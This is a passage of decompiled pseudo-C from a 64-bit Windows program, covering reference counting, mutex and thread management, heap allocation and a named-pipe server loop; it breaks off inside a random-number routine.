{
  __int64 v2; // rbx
  _QWORD *v3; // rdi
  __int64 v4; // r8
  __int64 v5; // rdx
  __int64 result; // rax
  __int64 v7; // rbx
  __int64 v8; // [rsp+38h] [rbp-20h]
  __m128i v9; // [rsp+40h] [rbp-18h]

  v2 = a2;
  v3 = a1;
  v8 = *(_QWORD *)(a2 - 24);
  _mm_storeu_si128(&v9, (__m128i)0i64);
  v4 = *(_QWORD *)(a2 - 8);
  v5 = *(_QWORD *)(a2 - 16);
  if ( v4 )
    _InterlockedIncrement((volatile signed __int32 *)(v4 + 8));
  sub_140029830(&v9, v5, v4);
  *(_QWORD *)(v2 - 24) = *v3;
  sub_140074710((_QWORD *)(v2 - 16), v3 + 1);
  result = sub_140075C60(
             (__int64)v3,
             0i64,
             ((signed __int64)((unsigned __int128)((v2 - (signed __int64)v3 - 24)
                                                 * (signed __int128)3074457345618258603i64) >> 64) >> 2)
           + ((unsigned __int64)((unsigned __int128)((v2 - (signed __int64)v3 - 24)
                                                   * (signed __int128)3074457345618258603i64) >> 64) >> 63),
             &v8);
  if ( v9.m128i_i64[1] && !_InterlockedDecrement((volatile signed __int32 *)(v9.m128i_i64[1] + 8)) )
  {
    v7 = v9.m128i_i64[1];
    result = (**(__int64 (__fastcall ***)(__int64))v9.m128i_i64[1])(v9.m128i_i64[1]);
    if ( !_InterlockedDecrement((volatile signed __int32 *)(v7 + 12)) )
      result = (*(__int64 (__cdecl **)(__int64))(*(_QWORD *)v9.m128i_i64[1] + 8i64))(v9.m128i_i64[1]);
  }
  return result;
}

//----- (0000000140075EB0) ----------------------------------------------------
_QWORD *__fastcall sub_140075EB0(_QWORD *a1, __int64 *a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // r8
  __int64 v4; // rdx
  int v5; // eax
  _QWORD *result; // rax

  v2 = a1;
  *a1 = 0i64;
  a1[1] = 0i64;
  v3 = a2[1];
  v4 = *a2;
  if ( v3 )
    _InterlockedIncrement((volatile signed __int32 *)(v3 + 8));
  sub_140029830(a1, v4, v3);
  v2[2] = 0i64;
  v2[3] = 0i64;
  *((_DWORD *)v2 + 10) = 0;
  v5 = Mtx_init(v2 + 6, 2i64);
  if ( v5 )
    std::_Throw_C_error(v5);
  result = v2;
  *((_BYTE *)v2 + 64) = 0;
  return result;
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1630: using guessed type __int64 __fastcall Mtx_init(_QWORD, _QWORD);

//----- (0000000140075F30) ----------------------------------------------------
__int64 __fastcall sub_140075F30(__int64 a1)
{
  __int64 v1; // rdi
  __int64 result; // rax
  volatile signed __int32 *v3; // rbx
  volatile signed __int32 *v4; // rbx

  v1 = a1;
  sub_140076260(a1);
  result = _Mtx_destroy(v1 + 48);
  if ( *(_DWORD *)(v1 + 40) )
    terminate();
  v3 = *(volatile signed __int32 **)(v1 + 24);
  if ( v3 )
  {
    if ( !_InterlockedDecrement(v3 + 2) )
    {
      result = (**(__int64 (__fastcall ***)(volatile signed __int32 *))v3)(v3);
      if ( !_InterlockedDecrement(v3 + 3) )
        result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v3 + 8i64))(v3);
    }
  }
  v4 = *(volatile signed __int32 **)(v1 + 8);
  if ( v4 && !_InterlockedDecrement(v4 + 2) )
  {
    result = (**(__int64 (__fastcall ***)(volatile signed __int32 *))v4)(v4);
    if ( !_InterlockedDecrement(v4 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 8i64))(v4);
  }
  return result;
}
// 1400A1628: using guessed type __int64 __fastcall _Mtx_destroy(_QWORD);
// 1400A1A58: using guessed type void terminate(void);

//----- (0000000140075FD0) ----------------------------------------------------
_BOOL8 __fastcall sub_140075FD0(__int64 a1)
{
  signed __int64 v1; // rdi
  __int64 v2; // rbx
  int v3; // eax
  bool v4; // bl
  int v5; // eax

  v1 = a1 + 48;
  v2 = a1;
  v3 = Mtx_lock(a1 + 48);
  if ( v3 )
    std::_Throw_C_error(v3);
  v4 = *(_BYTE *)(v2 + 64) && *(_QWORD *)(v2 + 16);
  v5 = Mtx_unlock(v1);
  if ( v5 )
    std::_Throw_C_error(v5);
  return v4;
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (0000000140076030) ----------------------------------------------------
__int64 __fastcall sub_140076030(__int64 a1)
{
  __int64 v1; // rbx
  signed __int64 v2; // rdi
  int v3; // eax
  char *v4; // rbx
  signed __int64 v5; // rsi
  int v6; // eax
  char v7; // bl
  int v8; // eax
  unsigned __int8 v9; // bl
  int v10; // eax

  v1 = a1;
  v2 = a1 + 48;
  v3 = Mtx_lock(a1 + 48);
  if ( v3 )
    std::_Throw_C_error(v3);
  if ( !*(_BYTE *)(v1 + 64) )
    goto LABEL_16;
  v4 = *(char **)v1;
  v5 = (signed __int64)(v4 + 8);
  v6 = Mtx_lock(v4 + 8);
  if ( v6 )
    std::_Throw_C_error(v6);
  v7 = *v4;
  v8 = Mtx_unlock(v5);
  if ( v8 )
    std::_Throw_C_error(v8);
  if ( v7 )
    v9 = 1;
  else
LABEL_16:
    v9 = 0;
  v10 = Mtx_unlock(v2);
  if ( v10 )
    std::_Throw_C_error(v10);
  return v9;
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (00000001400760E0) ----------------------------------------------------
void __fastcall sub_1400760E0(__int64 a1)
{
  __int64 v1; // rbx
  __int128 v2; // [rsp+20h] [rbp-28h]
  __int128 v3; // [rsp+30h] [rbp-18h]

  v1 = a1;
  if ( *(_DWORD *)(a1 + 40) )
  {
    if ( !*(_DWORD *)(a1 + 40) )
      std::_Throw_Cpp_error(1);
    v2 = *(_OWORD *)Thrd_current(&v3);
    v3 = *(_OWORD *)(v1 + 32);
    if ( (unsigned int)Thrd_equal(&v3, &v2) )
      std::_Throw_Cpp_error(5);
    v3 = *(_OWORD *)(v1 + 32);
    if ( (unsigned int)Thrd_join(&v3, 0i64) )
      std::_Throw_Cpp_error(2);
    *(_DWORD *)(v1 + 40) = 0;
  }
}
// 1400A1730: using guessed type void __stdcall std::_Throw_Cpp_error(_DWORD);
// 1400A1738: using guessed type __int64 __fastcall Thrd_current(_QWORD);
// 1400A1740: using guessed type __int64 __fastcall Thrd_equal(_QWORD, _QWORD);
// 1400A1750: using guessed type __int64 __fastcall Thrd_join(_QWORD, _QWORD);

//----- (0000000140076170) ----------------------------------------------------
char __fastcall sub_140076170(__int64 a1)
{
  return sub_140076180(a1, *(_QWORD *)(a1 + 56));
}

//----- (0000000140076180) ----------------------------------------------------
char __fastcall sub_140076180(__int64 a1, __int64 a2)
{
  __int64 v2; // rsi
  __int64 v3; // rbx
  signed __int64 v4; // rdi
  int v5; // eax
  int v6; // eax
  __int128 v8; // [rsp+38h] [rbp-50h]
  __int64 (__fastcall **v9)(); // [rsp+48h] [rbp-40h]
  void (__fastcall *v10)(__int64); // [rsp+68h] [rbp-20h]
  __int64 v11; // [rsp+70h] [rbp-18h]

  v2 = a2;
  v3 = a1;
  v4 = a1 + 48;
  v5 = Mtx_lock(a1 + 48);
  if ( v5 )
    std::_Throw_C_error(v5);
  if ( !*(_BYTE *)(v3 + 64) )
  {
    *(_BYTE *)(v3 + 64) = 1;
    sub_1400760E0(v3);
    *(_QWORD *)(v3 + 56) = v2;
    std::_Pad::_Pad((std::_Pad *)&v9);
    v9 = &off_1400AF560;
    v10 = sub_1400762E0;
    v11 = v3;
    std::_Pad::_Launch((std::_Pad *)&v9, (struct _Thrd_imp_t *)&v8);
    std::_Pad::~_Pad((std::_Pad *)&v9);
    if ( *(_DWORD *)(v3 + 40) )
      terminate();
    *(_OWORD *)(v3 + 32) = v8;
  }
  v6 = Mtx_unlock(v4);
  if ( v6 )
    std::_Throw_C_error(v6);
  return 1;
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);
// 1400A1718: using guessed type void std::_Pad::_Launch(std::_Pad *__hidden this, struct _Thrd_imp_t *);
// 1400A1720: using guessed type _QWORD std::_Pad::~_Pad(std::_Pad *__hidden this);
// 1400A1728: using guessed type _QWORD std::_Pad::_Pad(std::_Pad *__hidden this);
// 1400A1A58: using guessed type void terminate(void);
// 1400AF560: using guessed type __int64 (__fastcall *off_1400AF560)();

//----- (0000000140076260) ----------------------------------------------------
char __fastcall sub_140076260(__int64 a1)
{
  __int64 v1; // rbx
  signed __int64 v2; // rdi
  int v3; // eax
  __int64 v4; // rdx
  __int64 v5; // r8
  __int64 v6; // rcx
  int v7; // eax

  v1 = a1;
  v2 = a1 + 48;
  v3 = Mtx_lock(a1 + 48);
  if ( v3 )
    std::_Throw_C_error(v3);
  if ( *(_BYTE *)(v1 + 64) )
  {
    v6 = *(_QWORD *)(v1 + 16);
    if ( v6 )
      (*(void (__cdecl **)(__int64, __int64, __int64))(*(_QWORD *)v6 + 8i64))(v6, v4, v5);
    *(_BYTE *)(v1 + 64) = 0;
  }
  v7 = Mtx_unlock(v2);
  if ( v7 )
    std::_Throw_C_error(v7);
  return 1;
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (00000001400762E0) ----------------------------------------------------
void __fastcall sub_1400762E0(__int64 a1)
{
  __int64 v1; // rsi
  __int64 v2; // r8
  __int64 v3; // rcx
  void (****v4)(void); // rdi
  _QWORD *v5; // rdx
  char v6; // al
  volatile signed __int32 *v7; // rcx
  int v8; // eax
  int v9; // eax
  volatile signed __int32 *v10; // [rsp+28h] [rbp-10h]

  v1 = a1;
  while ( (unsigned __int8)sub_140076030(v1) )
  {
    v2 = *(_QWORD *)(v1 + 56);
    v3 = *(_QWORD *)v1;
    v4 = (void (****)(void))(v1 + 16);
    v5 = (_QWORD *)(v1 + 16);
    if ( v2 )
      v6 = sub_1400758A0(v3, v5, v2);
    else
      v6 = sub_140075A80(v3, v5, 0i64);
    if ( !v6 )
      break;
    (***v4)();
    v7 = *(volatile signed __int32 **)(v1 + 24);
    *(_QWORD *)(v1 + 24) = 0i64;
    v10 = v7;
    *v4 = 0i64;
    if ( v7 )
    {
      if ( !_InterlockedDecrement(v7 + 2) )
      {
        (**(void (__fastcall ***)(volatile signed __int32 *))v7)(v7);
        if ( !_InterlockedDecrement(v10 + 3) )
          (*(void (**)(void))(*(_QWORD *)v10 + 8i64))();
      }
    }
  }
  v8 = Mtx_lock(v1 + 48);
  if ( v8 )
    std::_Throw_C_error(v8);
  *(_BYTE *)(v1 + 64) = 0;
  v9 = Mtx_unlock(v1 + 48);
  if ( v9 )
    std::_Throw_C_error(v9);
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (00000001400763C0) ----------------------------------------------------
__int64 __fastcall sub_1400763C0(std::_Pad *a1)
{
  void (__fastcall *v1)(__int64); // rbx
  __int64 v2; // rdi

  v1 = (void (__fastcall *)(__int64))*((_QWORD *)a1 + 4);
  v2 = *((_QWORD *)a1 + 5);
  std::_Pad::_Release(a1);
  v1(v2);
  return 0i64;
}
// 1400A1710: using guessed type void std::_Pad::_Release(std::_Pad *__hidden this);

//----- (00000001400763F0) ----------------------------------------------------
__int64 __fastcall sub_1400763F0(__int64 a1)
{
  __int64 result; // rax
  __int64 v2; // rbx
  volatile signed __int32 *v3; // rdi

  result = *(_QWORD *)(a1 + 8);
  v2 = a1;
  v3 = *(volatile signed __int32 **)(result - 8);
  if ( v3 )
  {
    if ( _InterlockedDecrement(v3 + 2) )
    {
      *(_QWORD *)(a1 + 8) -= 24i64;
    }
    else
    {
      result = (**(__int64 (__fastcall ***)(volatile signed __int32 *))v3)(v3);
      if ( !_InterlockedDecrement(v3 + 3) )
        result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v3 + 8i64))(v3);
      *(_QWORD *)(v2 + 8) -= 24i64;
    }
  }
  else
  {
    *(_QWORD *)(a1 + 8) -= 24i64;
  }
  return result;
}

//----- (0000000140076470) ----------------------------------------------------
_QWORD *__fastcall sub_140076470(_QWORD *a1, _QWORD *a2, _QWORD *a3)
{
  _QWORD *v3; // rbx
  _QWORD *v4; // rax

  v3 = a1;
  v4 = sub_140004B80(a2, a3, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  sub_140003CB0(v3, v4);
  return v3;
}

//----- (00000001400764B0) ----------------------------------------------------
__int64 __fastcall sub_1400764B0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdi
  __int64 v5; // rbx

  v4 = a4;
  v5 = sub_140077800(a1, a2, a3);
  if ( v5 != -16 )
    sub_1400769E0(v5 + 16, v4);
  return v5;
}
// 1400769E0: using guessed type __int64 __fastcall sub_1400769E0(_QWORD, _QWORD);
// 140077800: using guessed type __int64 __fastcall sub_140077800(_QWORD, _QWORD, _QWORD);

//----- (0000000140076500) ----------------------------------------------------
char *__fastcall sub_140076500(_OWORD *a1)
{
  _OWORD *v1; // rdi
  HANDLE v2; // rax
  const char *v3; // rax
  char *v4; // rbx
  void *v6; // [rsp+28h] [rbp-20h]
  const char *v7; // [rsp+58h] [rbp+10h]
  const char *v8; // [rsp+60h] [rbp+18h]
  const char *v9; // [rsp+68h] [rbp+20h]

  v1 = a1;
  v2 = GetProcessHeap();
  v3 = (const char *)HeapAlloc(v2, 0, 0x88ui64);
  v4 = (char *)v3;
  v7 = v3;
  if ( !v3 )
  {
    v7 = "bad allocation";
    std::exception::exception((std::exception *)&v6, &v7, 1);
    v6 = &loc_1400A3C88;
    sub_140017340(&v6);
  }
  v8 = v3;
  v9 = v3;
  sub_1400186C0((__int64)v3);
  *(_QWORD *)v4 = &off_1400A5108;
  *(_OWORD *)(v4 + 120) = *v1;
  return v4;
}
// 140017340: using guessed type __int64 __fastcall sub_140017340(_QWORD);
// 1400A1990: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *, _DWORD);
// 1400A5108: using guessed type __int64 (__fastcall *off_1400A5108)(void *);

//----- (00000001400765B0) ----------------------------------------------------
char *__fastcall sub_1400765B0(__int64 a1)
{
  __int64 v1; // rdi
  HANDLE v2; // rax
  const char *v3; // rax
  char *v4; // rbx
  void *v6; // [rsp+28h] [rbp-20h]
  const char *v7; // [rsp+58h] [rbp+10h]
  const char *v8; // [rsp+60h] [rbp+18h]
  const char *v9; // [rsp+68h] [rbp+20h]

  v1 = a1;
  v2 = GetProcessHeap();
  v3 = (const char *)HeapAlloc(v2, 0, 0x90ui64);
  v4 = (char *)v3;
  v7 = v3;
  if ( !v3 )
  {
    v7 = "bad allocation";
    std::exception::exception((std::exception *)&v6, &v7, 1);
    v6 = &loc_1400A3C88;
    sub_140017340(&v6);
  }
  v8 = v3;
  v9 = v3;
  sub_1400186C0((__int64)v3);
  *(_QWORD *)v4 = &off_1400AF738;
  *(_OWORD *)(v4 + 120) = *(_OWORD *)v1;
  *((_QWORD *)v4 + 17) = *(_QWORD *)(v1 + 16);
  return v4;
}
// 140017340: using guessed type __int64 __fastcall sub_140017340(_QWORD);
// 1400A1990: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *, _DWORD);
// 1400AF738: using guessed type __int64 (__fastcall *off_1400AF738)(void *);

//----- (0000000140076670) ----------------------------------------------------
char **__fastcall sub_140076670(char **a1, _OWORD *a2)
{
  char **v2; // rbx
  char *v3; // rax

  v2 = a1;
  v3 = sub_140076500(a2);
  *v2 = v3;
  if ( v3 )
    _InterlockedIncrement((volatile signed __int32 *)v3 + 2);
  return v2;
}

//----- (00000001400766A0) ----------------------------------------------------
char **__fastcall sub_1400766A0(char **a1, __int64 a2)
{
  char **v2; // rbx
  char *v3; // rax

  v2 = a1;
  v3 = sub_1400765B0(a2);
  *v2 = v3;
  if ( v3 )
    _InterlockedIncrement((volatile signed __int32 *)v3 + 2);
  return v2;
}

//----- (00000001400766D0) ----------------------------------------------------
_QWORD *__fastcall sub_1400766D0(__int64 a1, _QWORD *a2, _QWORD *a3, _QWORD *a4)
{
  _QWORD *v4; // r12
  _QWORD *v5; // rdi
  _QWORD *v6; // r13
  _QWORD *v7; // r15
  signed __int64 v8; // rsi
  signed __int64 v9; // r14
  __int64 v10; // rax
  __int64 v11; // rax
  _QWORD *v12; // rax
  _QWORD *v13; // rbx
  _QWORD *v14; // rbx
  DWORD v15; // edi
  __int64 v16; // rax
  __int64 v17; // rax
  _QWORD *v18; // rbx
  int v20; // [rsp+3Ch] [rbp-C4h]
  signed int *v21; // [rsp+40h] [rbp-C0h]
  void *v22; // [rsp+50h] [rbp-B0h]
  __int64 (__fastcall **v23)(void *); // [rsp+58h] [rbp-A8h]
  char v24; // [rsp+60h] [rbp-A0h]
  __int64 v25; // [rsp+C0h] [rbp-40h]
  int v26; // [rsp+C8h] [rbp-38h]
  char v27; // [rsp+D8h] [rbp-28h]
  void *v28; // [rsp+140h] [rbp+40h]
  __int64 v29; // [rsp+150h] [rbp+50h]
  unsigned __int64 v30; // [rsp+158h] [rbp+58h]
  void *v31; // [rsp+160h] [rbp+60h]
  unsigned __int64 v32; // [rsp+178h] [rbp+78h]
  void *v33; // [rsp+180h] [rbp+80h]
  unsigned __int64 v34; // [rsp+198h] [rbp+98h]
  void *Src; // [rsp+1A0h] [rbp+A0h]
  unsigned __int64 v36; // [rsp+1B8h] [rbp+B8h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = (_QWORD *)a1;
  *(_QWORD *)a1 = &off_1400AF718;
  *(_BYTE *)(a1 + 8) = 1;
  *(_QWORD *)(a1 + 16) = 0i64;
  v8 = a1 + 24;
  *(_QWORD *)(v8 + 24) = 15i64;
  *(_QWORD *)(v8 + 16) = 0i64;
  *(_BYTE *)v8 = 0;
  v9 = a1 + 56;
  *(_QWORD *)(v9 + 24) = 15i64;
  *(_QWORD *)(v9 + 16) = 0i64;
  *(_BYTE *)v9 = 0;
  *(_QWORD *)(a1 + 88) = 0i64;
  *(_QWORD *)(a1 + 96) = 0i64;
  *(_QWORD *)(a1 + 88) = sub_140077800(a1 + 88, 0i64, 0i64);
  unknown_libname_6(v7 + 13);
  v7[14] = *v5;
  v10 = v5[1];
  v7[15] = v10;
  if ( v10 )
    _InterlockedIncrement((volatile signed __int32 *)(v10 + 8));
  v7[16] = *v4;
  v11 = v4[1];
  v7[17] = v11;
  if ( v11 )
    _InterlockedIncrement((volatile signed __int32 *)(v11 + 8));
  v12 = sub_140076FC0(&Src);
  v13 = sub_140076470(&v28, v12, v6);
  if ( (_QWORD *)v9 != v13 )
  {
    if ( v7[10] >= 0x10ui64 )
      operator delete(*(void **)v9);
    v7[10] = 15i64;
    v7[9] = 0i64;
    *(_BYTE *)v9 = 0;
    sub_140004720(v7 + 7, v13);
  }
  if ( v30 >= 0x10 )
    operator delete(v28);
  v30 = 15i64;
  v29 = 0i64;
  LOBYTE(v28) = 0;
  if ( v36 >= 0x10 )
    operator delete(Src);
  v21 = (signed int *)&unk_1400A6BB0;
  v22 = &unk_1400A6BB8;
  std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v27);
  std::basic_iostream<char,std::char_traits<char>>::basic_iostream<char,std::char_traits<char>>(&v21, &v23, 0i64);
  *(signed int **)((char *)&v21 + v21[1]) = (signed int *)&off_1400A6BA8;
  *(int *)((char *)&v20 + v21[1]) = v21[1] - 152;
  std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(&v23);
  v23 = &off_1400A6430;
  v25 = 0i64;
  v26 = 0;
  v14 = sub_140077190(&v33);
  v15 = GetCurrentProcessId();
  v16 = sub_140022840(&v22, v14);
  v17 = sub_140022840(v16, v6);
  std::basic_ostream<char,std::char_traits<char>>::operator<<(v17, v15);
  if ( v34 >= 0x10 )
    operator delete(v33);
  v18 = sub_14002A070((__int64)&v21, &v31);
  if ( (_QWORD *)v8 != v18 )
  {
    if ( v7[6] >= 0x10ui64 )
      operator delete(*(void **)v8);
    v7[6] = 15i64;
    v7[5] = 0i64;
    *(_BYTE *)v8 = 0;
    sub_140004720(v7 + 3, v18);
  }
  if ( v32 >= 0x10 )
    operator delete(v31);
  *(signed int **)((char *)&v21 + v21[1]) = (signed int *)&off_1400A6BA8;
  *(int *)((char *)&v20 + v21[1]) = v21[1] - 152;
  sub_140023CD0((__int64)&v23);
  std::basic_iostream<char,std::char_traits<char>>::~basic_iostream<char,std::char_traits<char>>(&v24);
  std::basic_ios<char,std::char_traits<char>>::~basic_ios<char,std::char_traits<char>>(&v27);
  return v7;
}
// 140022840: using guessed type __int64 __fastcall sub_140022840(_QWORD, _QWORD);
// 140077800: using guessed type __int64 __fastcall sub_140077800(_QWORD, _QWORD, _QWORD);
// 1400A1470: using guessed type __int64 __fastcall std::basic_ostream<char,std::char_traits<char>>::operator<<(_QWORD, _QWORD);
// 1400A14F8: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(_QWORD);
// 1400A15C8: using guessed type __int64 __fastcall std::basic_iostream<char,std::char_traits<char>>::~basic_iostream<char,std::char_traits<char>>(_QWORD);
// 1400A15D0: using guessed type __int64 __fastcall std::basic_iostream<char,std::char_traits<char>>::basic_iostream<char,std::char_traits<char>>(_QWORD, _QWORD, _QWORD);
// 1400A1690: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::~basic_ios<char,std::char_traits<char>>(_QWORD);
// 1400A16B8: using guessed type __int64 __cdecl std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(_QWORD);
// 1400A6430: using guessed type __int64 (__fastcall *off_1400A6430)(void *);
// 1400A6BA8: using guessed type __int64 (__fastcall *off_1400A6BA8)();
// 1400AF718: using guessed type __int64 (__fastcall *off_1400AF718)(void *);

//----- (0000000140076A60) ----------------------------------------------------
void __fastcall sub_140076A60(void ***a1)
{
  void **v1; // rbx

  v1 = (void **)a1;
  sub_140077860(a1);
  operator delete(*v1);
}

//----- (0000000140076A80) ----------------------------------------------------
void __fastcall sub_140076A80(__int64 *a1)
{
  __int64 v1; // rbx

  v1 = *a1;
  if ( *a1 )
  {
    if ( *(_QWORD *)(v1 + 24) >= 0x10ui64 )
      operator delete(*(void **)v1);
    *(_QWORD *)(v1 + 24) = 15i64;
    *(_QWORD *)(v1 + 16) = 0i64;
    *(_BYTE *)v1 = 0;
    operator delete((void *)v1);
  }
}

//----- (0000000140076C10) ----------------------------------------------------
void *__fastcall sub_140076C10(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140076AD0();
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 140076AD0: using guessed type __int64 sub_140076AD0(void);

//----- (0000000140076C40) ----------------------------------------------------
_QWORD *__fastcall sub_140076C40(_QWORD *a1, char a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  *a1 = &off_1400AF6F8;
  if ( a2 & 1 )
    operator delete(a1);
  return v2;
}
// 1400AF6F8: using guessed type __int64 (__fastcall *off_1400AF6F8)();

//----- (0000000140076C70) ----------------------------------------------------
BOOL __fastcall sub_140076C70(__int64 a1)
{
  __int64 v1; // rsi
  const CHAR *v2; // rdi
  struct _SECURITY_ATTRIBUTES *v3; // rax
  HANDLE v4; // r14
  void *v5; // r15
  const CHAR *v6; // rbx
  const CHAR *v7; // rdi
  struct _SECURITY_ATTRIBUTES *lpSecurityAttributes; // rax
  HANDLE v9; // rdi
  struct _SECURITY_ATTRIBUTES *v10; // rax
  DWORD v11; // eax
  HANDLE v12; // rcx
  __int64 v13; // rcx
  __int64 v14; // rdi
  __int64 v15; // rax
  __int64 v16; // rdx
  void (__fastcall ***v17)(void *, _QWORD); // rbx
  HANDLE v18; // rax
  __int64 v19; // rax
  LPVOID lpMem; // [rsp+40h] [rbp-98h]
  __int128 v22; // [rsp+48h] [rbp-90h]
  struct _OVERLAPPED Overlapped; // [rsp+58h] [rbp-80h]
  __int128 v24; // [rsp+78h] [rbp-60h]
  void *v25; // [rsp+88h] [rbp-50h]
  __int128 v26; // [rsp+A0h] [rbp-38h]
  char v27; // [rsp+B0h] [rbp-28h]
  __int64 v28; // [rsp+C0h] [rbp-18h]
  __int64 v29; // [rsp+C8h] [rbp-10h]

  Overlapped.Pointer = (PVOID)-2i64;
  v1 = a1;
  if ( *(_QWORD *)(a1 + 80) < 0x10ui64 )
    v2 = (const CHAR *)(a1 + 56);
  else
    v2 = *(const CHAR **)(a1 + 56);
  v3 = (struct _SECURITY_ATTRIBUTES *)sub_140079840();
  v4 = CreateEventA(v3, 1, 0, v2);
  if ( v4 )
    sub_140079BF0((LPSTR)(v1 + 56));
  v5 = v4;
  while ( *(_BYTE *)(v1 + 8) )
  {
    v6 = (const CHAR *)(v1 + 24);
    if ( *(_QWORD *)(v1 + 48) < 0x10ui64 )
      v7 = (const CHAR *)(v1 + 24);
    else
      v7 = *(const CHAR **)v6;
    lpSecurityAttributes = (struct _SECURITY_ATTRIBUTES *)sub_140079840();
    v9 = CreateNamedPipeA(v7, 0x40080001u, 6u, 0xFFu, 0x800u, 0x800u, 0, lpSecurityAttributes);
    if ( v9 == (HANDLE)-1i64 )
    {
      if ( *(_QWORD *)(v1 + 48) >= 0x10ui64 )
        v6 = *(const CHAR **)v6;
      v10 = (struct _SECURITY_ATTRIBUTES *)sub_140079840();
      v9 = CreateNamedPipeA(v6, 0x40000001u, 6u, 0xFFu, 0x800u, 0x800u, 0, v10);
      if ( v9 == (HANDLE)-1i64 )
        continue;
    }
    sub_140079B40(v9);
    Overlapped.Internal = 0i64;
    Overlapped.InternalHigh = 0i64;
    Overlapped.Pointer = 0i64;
    Overlapped.hEvent = 0i64;
    Overlapped.hEvent = CreateEventW(0i64, 1, 0, 0i64);
    ConnectNamedPipe(v9, &Overlapped);
    if ( v5 )
    {
      SetEvent(v5);
      v5 = 0i64;
    }
    v11 = GetLastError();
    if ( v11 == 535
      || v11 == 997
      && (Overlapped.Internal = *(_QWORD *)(v1 + 16),
          Overlapped.InternalHigh = (ULONG_PTR)Overlapped.hEvent,
          WaitForMultipleObjects(2u, (const HANDLE *)&Overlapped, 0, 0xFFFFFFFF)) )
    {
      *(_QWORD *)&v22 = v1;
      *((_QWORD *)&v22 + 1) = v9;
      Overlapped.hEvent = sub_140077370;
      v24 = v22;
      sub_1400766A0((char **)&lpMem, (__int64)&Overlapped.hEvent);
      if ( !sub_140036990(&lpMem) )
        goto LABEL_29;
      v14 = *(_QWORD *)(v1 + 88);
      v15 = sub_1400764B0(v1 + 88, *(_QWORD *)(v1 + 88), *(_QWORD *)(v14 + 8), (__int64)&lpMem);
      v16 = *(_QWORD *)(v1 + 96);
      if ( (unsigned __int64)(768614336404564649i64 - v16) < 1 )
      {
        std::_Xlength_error("list<T> too long");
LABEL_29:
        v19 = sub_140030C00(v13);
        LODWORD(v22) = 11;
        *((_QWORD *)&v22 + 1) = v19;
        *(_QWORD *)&v24 = "boost::thread_resource_error";
        std::exception::exception((std::exception *)&v25, (const char *const *)&v24);
        v26 = v22;
        v29 = 15i64;
        v28 = 0i64;
        v27 = 0;
        v25 = &loc_1400A3CD0;
        sub_140010B60((const struct std::exception *)&v25);
      }
      *(_QWORD *)(v1 + 96) = v16 + 1;
      *(_QWORD *)(v14 + 8) = v15;
      **(_QWORD **)(v15 + 8) = v15;
      sub_1400366B0((volatile signed __int32 **)&lpMem);
      v17 = (void (__fastcall ***)(void *, _QWORD))lpMem;
      if ( lpMem )
      {
        if ( !_InterlockedDecrement((volatile signed __int32 *)lpMem + 2) )
        {
          (**v17)(v17, 0i64);
          v18 = GetProcessHeap();
          HeapFree(v18, 0, v17);
        }
      }
      v12 = v4;
    }
    else
    {
      DisconnectNamedPipe(v9);
      CloseHandle(v9);
      v12 = Overlapped.hEvent;
    }
    ResetEvent(v12);
    CloseHandle(Overlapped.hEvent);
  }
  return CloseHandle(v4);
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);

//----- (0000000140076FC0) ----------------------------------------------------
_QWORD *__fastcall sub_140076FC0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DBE04;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DBE04 & 1 )
  {
    v5 = byte_1400DBE00;
  }
  else
  {
    v4 = 69069 * dword_1400DBDF4 + 1234567;
    v1 = dword_1400DBE04 | 1;
    dword_1400DBDF4 = v4;
    dword_1400DBE04 |= 1u;
    dword_1400DBDEC = HIWORD(dword_1400DBDEC) + 36969 * (unsigned __int16)dword_1400DBDEC;
